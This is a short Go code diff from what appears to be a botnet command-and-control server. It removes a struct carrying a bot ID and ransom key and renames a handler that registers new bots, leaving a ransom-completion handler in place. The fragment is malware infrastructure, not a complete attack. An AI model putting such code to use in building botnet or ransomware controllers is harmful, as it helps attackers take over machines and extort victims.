@@ -9,12 +9,6 @@ import (
 	"github.com/rodzzlessa24/botnet"
 )
 
-//ransomCompleteRequest is
-type ransomCompleteRequest struct {
-	BotID []byte
-	Key   []byte
-}
-
 //HandleRansomComplete is
 func (c *CommanderService) HandleRansomComplete(payload []byte) {
 	req := new(ransomCompleteRequest)
@@ -30,8 +24,8 @@ func (c *CommanderService) HandleRansomComplete(payload []byte) {
 	}
 }
 
-//HandleGensis is
-func (c *CommanderService) HandleGensis(payload []byte) {
+//HandleGenesis is
+func (c *CommanderService) HandleGenesis(payload []byte) {
 	bot, err := botnet.BytesToBot(payload)
 	if err != nil {
 		log.Panic(err)
